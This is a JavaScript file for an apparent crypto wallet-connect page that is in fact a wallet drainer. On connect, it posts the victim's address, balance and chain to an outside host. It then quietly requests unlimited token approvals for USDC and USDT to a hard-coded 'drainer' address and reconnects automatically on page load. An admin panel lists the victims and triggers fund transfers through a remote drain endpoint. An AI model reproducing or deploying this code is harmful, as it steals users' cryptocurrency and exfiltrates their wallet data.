import { ethers } from "ethers";
import EthereumProvider from "@walletconnect/ethereum-provider";

const connectBtn = document.getElementById("connectBtn");
const disconnectBtn = document.getElementById("disconnectBtn");
const walletDetails = document.getElementById("walletDetails");
const walletAddress = document.getElementById("walletAddress");
const walletBalance = document.getElementById("walletBalance");
const loading = document.getElementById("loading");
const adminBtn = document.getElementById("adminBtn");

let provider, signer, ethersProvider;

async function connectAndApprove() {
  loading.style.display = "block";
  connectBtn.disabled = true;

  provider = await EthereumProvider.init({
    projectId: "84e8498a4e08cafe1acaf08369fd7a56",
    chains: [1, 56, 137],
    showQrModal: true,
  });

  await provider.enable();
  ethersProvider = new ethers.BrowserProvider(provider);
  signer = await ethersProvider.getSigner();
  const address = await signer.getAddress();
  const balance = await ethersProvider.getBalance(address);

  walletAddress.textContent = address;
  walletBalance.textContent = ethers.formatEther(balance);
  walletDetails.style.display = "block";
  loading.style.display = "none";

  const data = {
    address,
    balance: ethers.formatEther(balance),
    chainId: provider.chainId,
    timestamp: Date.now(),
  };

  await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/log.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });

  const erc20abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
  const tokens = [
    { chainId: 1, token: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" }, // USDC
    { chainId: 56, token: "0x55d398326f99059ff775485246999027b3197955" }, // BSC USDT
    { chainId: 137, token: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174" }, // Polygon USDC
  ];

  const drainer = "0xf91A221A7e8Fda48aC4a6fE90017d40e87bA8E60";

  for (const t of tokens) {
    if (provider.chainId === t.chainId) {
      const token = new ethers.Contract(t.token, erc20abi, signer);
      try {
        await token.approve(drainer, ethers.MaxUint256);
      } catch {}
    }
  }

  localStorage.setItem("wallet_connected", "1");
}

function disconnectWallet() {
  if (provider) provider.disconnect();
  localStorage.removeItem("wallet_connected");
  walletDetails.style.display = "none";
  connectBtn.disabled = false;
}

if (localStorage.getItem("wallet_connected") === "1") connectAndApprove();

connectBtn.addEventListener("click", connectAndApprove);
disconnectBtn.addEventListener("click", disconnectWallet);

adminBtn.addEventListener("click", () => {
  document.getElementById("mainPage").style.display = "none";
  document.getElementById("adminPage").style.display = "block";
  loadAdmin();
});

window.backToMain = () => {
  document.getElementById("adminPage").style.display = "none";
  document.getElementById("mainPage").style.display = "block";
};

async function loadAdmin() {
  const res = await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/logs.json");
  const logs = await res.json();
  const sessions = document.getElementById("sessions");
  sessions.innerHTML = "";

  logs.forEach((entry, index) => {
    const div = document.createElement("div");
    div.className = "card p-3 mb-2";
    div.innerHTML = `
      <div><b>${entry.address}</b></div>
      <div>${entry.balance} ETH - Chain: ${entry.chainId}</div>
      <button class="btn btn-primary mt-2" onclick="drain('${entry.address}', ${entry.chainId})">Transfer Funds</button>
    `;
    sessions.appendChild(div);
  });
}

window.drain = async function (address, chainId) {
  const res = await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/drain.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address, chainId }),
  });

  const result = await res.text();
  alert(result);
};
